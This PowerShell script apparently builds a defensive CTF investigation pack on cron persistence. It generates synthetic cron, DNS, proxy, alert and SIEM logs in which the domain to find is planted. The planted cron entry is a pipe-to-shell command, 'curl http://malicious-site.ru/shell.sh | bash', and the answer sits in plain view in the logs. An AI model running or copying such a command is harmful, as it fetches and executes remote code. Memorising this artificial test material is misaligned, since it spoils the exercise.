param()

$ErrorActionPreference = "Stop"

$bundleName = "m5-04-cron-persistence"
$artifactRoot = Join-Path $PSScriptRoot "..\artifacts\m5"
$artifactRoot = [System.IO.Path]::GetFullPath($artifactRoot)
$zipPath = Join-Path $artifactRoot "$bundleName.zip"
$buildRoot = Join-Path $env:TEMP "m5_04_realworld_build"
$bundleRoot = Join-Path $buildRoot $bundleName

function Write-TextFile {
    param([string]$Path, [string]$Content)
    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    [System.IO.File]::WriteAllText(
        $Path,
        $Content.Replace("`n", [Environment]::NewLine),
        [System.Text.Encoding]::UTF8
    )
}

function Write-LinesFile {
    param([string]$Path, [System.Collections.Generic.List[string]]$Lines)
    $parent = Split-Path -Parent $Path
    if ($parent) {
        New-Item -ItemType Directory -Force -Path $parent | Out-Null
    }
    [System.IO.File]::WriteAllLines($Path, $Lines, [System.Text.Encoding]::UTF8)
}

function New-CronInventory {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,host,owner,schedule,command,source")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $owners = @("root","backup","www-data","deploy","logrotate")
    $commands = @(
        "/usr/local/bin/backup.sh",
        "/usr/bin/find /var/log -type f -mtime +30 -delete",
        "/usr/local/bin/metrics_collector --push",
        "/usr/bin/python3 /opt/jobs/cache_warm.py",
        "/usr/local/bin/cert_check --renew"
    )

    for ($i = 0; $i -lt 7200; $i++) {
        $ts = $base.AddSeconds($i * 9).ToString("o")
        $node = "lin-app-{0:D2}" -f (1 + ($i % 9))
        $owner = $owners[$i % $owners.Count]
        $schedule = "*/$((($i % 12) + 1)) * * * *"
        $cmd = $commands[$i % $commands.Count]
        $src = if (($i % 2) -eq 0) { "/etc/crontab" } else { "/var/spool/cron/$owner" }
        $lines.Add("$ts,$node,$owner,""$schedule"",""$cmd"",$src")
    }

    $lines.Add("2026-03-08T03:20:00Z,lin-app-03,deploy,""*/10 * * * *"",""curl http://malicious-site.ru/shell.sh | bash"",""/var/spool/cron/deploy""")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-CrontabSnapshot {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("# /var/spool/cron/deploy snapshot timeline")
    $lines.Add("# collected by EDR cron monitor")

    for ($i = 0; $i -lt 6200; $i++) {
        $minute = $i % 60
        $job = if (($i % 17) -eq 0) { "/usr/local/bin/rotate_tmp.sh" } else { "/usr/local/bin/queue_sync.sh --batch" }
        $lines.Add(("{0:D2} * * * * {1}" -f $minute, $job))
    }

    $lines.Add("*/10 * * * * curl http://malicious-site.ru/shell.sh | bash")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-DnsQueries {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $domains = @("api.github.com","pypi.org","security.ubuntu.com","repo.mysql.com","monitoring.internal.local")

    for ($i = 0; $i -lt 6500; $i++) {
        $ts = $base.AddSeconds($i * 8).ToString("yyyy-MM-ddTHH:mm:ssZ")
        $src = "10.$(42 + ($i % 20)).$((10 + $i) % 220).$((30 + $i) % 220)"
        $domain = $domains[$i % $domains.Count]
        $rcode = if (($i % 223) -eq 0) { "NXDOMAIN" } else { "NOERROR" }
        $lines.Add("$ts resolver-01 query src_ip=$src qname=$domain qtype=A rcode=$rcode")
    }

    $lines.Add("2026-03-08T03:20:00Z resolver-01 query src_ip=10.63.21.19 qname=malicious-site.ru qtype=A rcode=NOERROR")
    $lines.Add("2026-03-08T03:30:00Z resolver-01 query src_ip=10.63.21.19 qname=malicious-site.ru qtype=A rcode=NOERROR")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-ProxyEgress {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $nodes = @("lin-app-01","lin-app-02","lin-app-03","lin-app-04")

    for ($i = 0; $i -lt 6100; $i++) {
        $ts = $base.AddSeconds($i * 10).ToString("o")
        $node = $nodes[$i % $nodes.Count]
        $dom = if (($i % 13) -eq 0) { "packages.ubuntu.com" } else { "github.com" }
        $uri = if ($dom -eq "github.com") { "/repos/org/repo/$((100 + $i) % 9000)" } else { "/ubuntu/pool/main/$((100 + $i) % 900)" }
        $lines.Add("$ts host=$node method=GET domain=$dom uri=$uri status=200 bytes=$((800 + ($i % 17000)))")
    }

    $lines.Add("2026-03-08T03:20:01Z host=lin-app-03 method=GET domain=malicious-site.ru uri=/shell.sh status=200 bytes=24481 user=deploy")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-PersistenceAlerts {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)
    $types = @("cron_baseline_watch","script_exec_watch","network_egress_watch","integrity_watch")

    for ($i = 0; $i -lt 4200; $i++) {
        $entry = [ordered]@{
            timestamp_utc = $base.AddSeconds($i * 12).ToString("o")
            alert_id = "cron-" + ("{0:D8}" -f (66000000 + $i))
            severity = if (($i % 181) -eq 0) { "medium" } else { "low" }
            type = $types[$i % $types.Count]
            status = "closed_noise"
            detail = "routine scheduler activity"
        }
        $lines.Add(($entry | ConvertTo-Json -Compress))
    }

    $lines.Add((([ordered]@{
        timestamp_utc = "2026-03-08T03:20:00Z"
        alert_id = "cron-99933001"
        severity = "critical"
        type = "suspicious_cron_network_command"
        status = "open"
        detail = "new cron job executes remote script fetch and pipe-to-shell"
        suspicious_domain = "malicious-site.ru"
        host = "lin-app-03"
    }) | ConvertTo-Json -Compress))
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-SiemTimeline {
    param([string]$OutputPath)

    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("timestamp_utc,event_type,system,severity,details")
    $base = [datetime]::SpecifyKind([datetime]"2026-03-07T00:00:00", [DateTimeKind]::Utc)

    for ($i = 0; $i -lt 5200; $i++) {
        $ts = $base.AddSeconds($i * 10).ToString("o")
        $evt = if (($i % 269) -eq 0) { "persistence_review" } else { "routine_scheduler_monitoring" }
        $sev = if ($evt -eq "persistence_review") { "medium" } else { "low" }
        $lines.Add("$ts,$evt,siem-persist-01,$sev,scheduled task telemetry baseline")
    }

    $lines.Add("2026-03-08T03:20:00Z,malicious_cron_detected,siem-persist-01,critical,new cron entry fetches script from malicious-site.ru")
    $lines.Add("2026-03-08T03:20:01Z,suspicious_egress_correlated,siem-persist-01,high,proxy confirms outbound fetch from malicious-site.ru/shell.sh")
    $lines.Add("2026-03-08T03:20:12Z,incident_opened,siem-persist-01,high,INC-2026-5504 cron persistence investigation")
    Write-LinesFile -Path $OutputPath -Lines $lines
}

function New-Policy {
    param([string]$OutputPath)

    $content = @'
Scheduled Task Security Policy (Excerpt)

1) Cron jobs must not pull executable content from external internet domains.
2) Any curl|bash style cron command is classified as high risk persistence.
3) SOC triage must identify suspicious external domain involved.
'@
    Write-TextFile -Path $OutputPath -Content $content
}

function New-Runbook {
    param([string]$OutputPath)

    $content = @'
Cron Persistence Triage Runbook (Excerpt)

1) Inspect cron inventory and raw crontab snapshots.
2) Correlate scheduler entries with DNS and proxy egress events.
3) Extract suspicious external domain used by recurring command.
4) Contain host and remove unauthorized cron task.
'@
    Write-TextFile -Path $OutputPath -Content $content
}

Remove-Item -Recurse -Force $buildRoot -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force -Path (Join-Path $bundleRoot "evidence") | Out-Null

$description = @'
Challenge: M5-04 Cron Persistence (Real-World Investigation Pack)

Scenario:
A production Linux host was flagged for suspicious scheduled-task persistence using network-based command execution.

Task:
Analyze the investigation pack and identify the suspicious domain used by the cron persistence job.

Flag format:
CTF{answer}
'@
Write-TextFile -Path (Join-Path $bundleRoot "description.txt") -Content $description

$ticket = @'
Incident: INC-2026-5504
Severity: High
Queue: SOC + Linux Ops + Threat Hunting

Summary:
Telemetry detected a new recurring cron command fetching external script content.

Scope:
- Host: lin-app-03
- Window: 2026-03-08 03:20 UTC
- Goal: identify suspicious domain used in cron persistence
'@
Write-TextFile -Path (Join-Path $bundleRoot "evidence\briefing\incident_ticket.txt") -Content $ticket

$handoff = @'
Analyst handoff:
- Correlate cron inventory, crontab snapshots, DNS queries, proxy egress, persistence alerts, SIEM timeline, and policy/runbook guidance.
- Determine the suspicious domain used by the recurring malicious cron command.
'@
Write-TextFile -Path (Join-Path $bundleRoot "evidence\briefing\analyst_handoff.txt") -Content $handoff

New-CronInventory -OutputPath (Join-Path $bundleRoot "evidence\persistence\cron_job_inventory.csv")
New-CrontabSnapshot -OutputPath (Join-Path $bundleRoot "evidence\persistence\deploy_crontab_snapshot.txt")
New-DnsQueries -OutputPath (Join-Path $bundleRoot "evidence\network\dns_query.log")
New-ProxyEgress -OutputPath (Join-Path $bundleRoot "evidence\network\proxy_egress.log")
New-PersistenceAlerts -OutputPath (Join-Path $bundleRoot "evidence\security\persistence_alerts.jsonl")
New-SiemTimeline -OutputPath (Join-Path $bundleRoot "evidence\siem\timeline_events.csv")
New-Policy -OutputPath (Join-Path $bundleRoot "evidence\policy\scheduled_task_security_policy.txt")
New-Runbook -OutputPath (Join-Path $bundleRoot "evidence\policy\cron_persistence_triage_runbook.txt")

New-Item -ItemType Directory -Force -Path $artifactRoot | Out-Null
if (Test-Path $zipPath) {
    Remove-Item -Force $zipPath
}
Compress-Archive -Path (Join-Path $bundleRoot "*") -DestinationPath $zipPath -Force
Remove-Item -Recurse -Force $buildRoot

Get-Item $zipPath | Select-Object FullName, Length, LastWriteTime
